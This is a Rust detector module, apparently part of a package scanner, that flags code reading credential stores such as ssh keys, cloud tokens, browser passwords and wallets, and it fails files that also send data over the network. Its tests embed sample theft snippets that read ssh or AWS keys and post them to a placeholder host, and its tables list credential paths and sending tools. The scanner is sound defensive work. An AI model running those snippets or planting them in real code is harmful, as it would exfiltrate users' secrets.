//! Credential stores: ssh keys, cloud and registry logins, browser
//! passwords and cookies, wallet files and keychains, read by code. A read
//! alone warns; a read in a file that also talks to the network, or in
//! installed code, fails, except in a shell script or a test.

use super::{Context, Kind, Suspect, line_of, push, test_path};

/// (what the path names, what it holds).
const STORES: &[(&str, &str)] = &[
    (".ssh/id_", "ssh private keys"),
    (".aws/credentials", "AWS credentials"),
    (".npmrc", "npm tokens"),
    (".git-credentials", "git credentials"),
    (".config/gcloud", "Google Cloud credentials"),
    (".kube/config", "Kubernetes credentials"),
    (".docker/config.json", "registry logins"),
    ("Login Data", "browser saved passwords"),
    ("/Cookies", "browser cookies"),
    ("Local Storage/leveldb", "browser extension storage (wallets keep keys there)"),
    ("find-generic-password", "the macOS keychain"),
    ("find-internet-password", "the macOS keychain"),
    ("wallet.dat", "a wallet file"),
    ("keystore", "a key store"),
    (".config/solana/id.json", "a Solana key"),
    ("Keychains/login.keychain", "the login keychain"),
];
/// The ways a file sends something somewhere.
const SENDS: &[&str] = &[
    "fetch(",
    "XMLHttpRequest",
    "sendBeacon(",
    "http.request(",
    "https.request(",
    "axios.",
    "WebSocket(",
    "curl ",
    "wget ",
    "requests.post(",
    "urllib.request",
    "socket.connect(",
    "nc ",
    "ncat ",
];

pub(super) fn scan(file: &str, text: &str, ctx: Context, kind: Kind, out: &mut Vec<Suspect>) {
    if !matches!(ctx, Context::Web | Context::Python | Context::Shell) {
        return;
    }
    let Some((needle, what)) = STORES.iter().find(|(n, _)| text.contains(n)) else { return };
    let sends = SENDS.iter().any(|s| text.contains(s));
    push(
        out,
        file,
        "SUSPECT-CREDENTIAL-ACCESS",
        line_of(text, needle),
        format!("reads {what} (`{needle}`){}", if sends { " and talks to the network" } else { "" }),
        (sends || kind == Kind::Installed) && ctx != Context::Shell && !test_path(file),
    );
}

#[cfg(test)]
mod tests {
    use super::super::{Kind, ids, scan_text};

    const STEAL: &str = "const fs=require('fs');\nconst k=fs.readFileSync(process.env.HOME+'/.ssh/id_ed25519');\nfetch('https://x.y/x',{method:'POST',body:k});\n";

    #[test]
    fn a_read_that_is_sent_fails() {
        let got = scan_text("postinstall.js", STEAL, Kind::Repo);
        assert_eq!(ids(&got), [("SUSPECT-CREDENTIAL-ACCESS", true)], "{got:?}");
        assert_eq!(got[0].line, 2);
        assert_eq!(got[0].note, "reads ssh private keys (`.ssh/id_`) and talks to the network");
        let py = "import requests\nk = open('~/.aws/credentials').read()\nrequests.post('https://x.y', data=k)\n";
        assert_eq!(ids(&scan_text("collect.py", py, Kind::Repo)), [("SUSPECT-CREDENTIAL-ACCESS", true)]);
        assert_eq!(
            ids(&scan_text("ext/bg.js", "chrome.storage.get('Local Storage/leveldb')", Kind::Installed)),
            [("SUSPECT-CREDENTIAL-ACCESS", true)],
            "installed code fails on the read alone"
        );
    }

    #[test]
    fn a_read_alone_or_in_a_shell_or_test_warns() {
        let got = scan_text("show.sh", "cat ~/.aws/credentials\n", Kind::Repo);
        assert_eq!(ids(&got), [("SUSPECT-CREDENTIAL-ACCESS", false)]);
        assert_eq!(got[0].note, "reads AWS credentials (`.aws/credentials`)");
        assert_eq!(
            ids(&scan_text("backup.sh", "tar c ~/.ssh/id_rsa | curl -T - https://x.y\n", Kind::Repo)),
            [("SUSPECT-CREDENTIAL-ACCESS", false)],
            "a shell script that sends still warns"
        );
        assert_eq!(
            ids(&scan_text("src/keys.test.js", STEAL, Kind::Repo)),
            [("SUSPECT-CREDENTIAL-ACCESS", false)],
            "tests warn"
        );
        assert_eq!(
            ids(&scan_text("src/config.js", "const k = fs.readFileSync(home + '/.npmrc');\n", Kind::Repo)),
            [("SUSPECT-CREDENTIAL-ACCESS", false)],
            "a read with nothing sent"
        );
        let one = scan_text("x.js", "'.npmrc' and '.kube/config'", Kind::Repo);
        assert_eq!(one.len(), 1, "one finding per file, the first in the table");
        assert!(one[0].note.contains("npm tokens"), "{}", one[0].note);
    }

    #[test]
    fn not_code_is_not_read() {
        assert!(scan_text("README.md", "copy ~/.aws/credentials and curl it", Kind::Repo).is_empty());
        assert!(
            scan_text("src/main.rs", "let p = home.join(\".ssh/id_ed25519\");", Kind::Repo).is_empty(),
            "native is not read"
        );
        assert!(scan_text("index.html", "<p>.npmrc</p><script>fetch(x)</script>", Kind::Repo).is_empty(), "nor markup");
        assert!(
            scan_text("x.js", "const url = 'https://x.y/api'; fetch(url)", Kind::Repo).is_empty(),
            "the network alone is nothing"
        );
    }
}
